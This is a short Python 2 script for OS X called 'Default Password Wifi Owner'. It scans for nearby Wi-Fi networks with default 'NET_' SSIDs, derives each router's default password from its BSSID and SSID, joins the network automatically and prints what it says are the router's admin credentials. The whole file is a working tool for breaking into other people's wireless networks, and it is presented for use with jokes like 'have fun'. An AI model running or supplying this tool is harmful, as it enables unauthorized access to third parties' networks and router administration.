# -*- coding: utf-8 -*-

import subprocess


'''
Default Password Wifi Owner 0.1v
Only works with OS X 
run with sudo
'''

def scan_network() :
    scan = ''

    while scan == '' : # for some reason airport fails randomly
        scan = subprocess.check_output(["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport","scan"]) # scan the area for wifi

    scan = scan.split("\n")
    scan.pop(0)
    results = []
    for w in scan :
        w = filter(None,w.split(" "))
        if any("NET_" in z for z in w) : #filter the NET's default SSID
            print "Found WIFI !"
            wifi = [w[0]]
            # the password consists of CM_MAC last 4 hexas of the router , which are the third hexa of the BSSID plus the last 3 hexas of the SSID
            password = ''.join(w[1].upper().split(":")[2:3])+w[0].split("_")[1][2:]
            results.append([w[0],password,w[1]])
    return results

def connect_net(wifi) :
    print "Trying to connect..."
    connect = subprocess.check_output(["networksetup", "-setairportnetwork", "en0", wifi[0] ,wifi[1]])

    print connect

    if "Failed" in connect :
        print "nope :("
        return 0

    print "Connected ! have fun (:"
    print "Here, the admin credentials of the router"
    print "User : "+wifi[0]
    print "Password : NET_"+wifi[1][2:] # the password is the full CM_MAC
    print "yeah ,I know..."
    exit(0)

def main() :

    print "DPWO 0.1v"
    print "≈≈≈≈≈≈≈≈≈≈≈≈≈≈"

    wifi_available= scan_network()

    if len(wifi_available) == 0 :
        print "No NET WiFi available :'("
        exit(0)

    for wifi in wifi_available :
        print "WI-FI : "+wifi[0]
        print "Password : "+wifi[1]
        connect_net(wifi)


if __name__ == "__main__" :
    main()
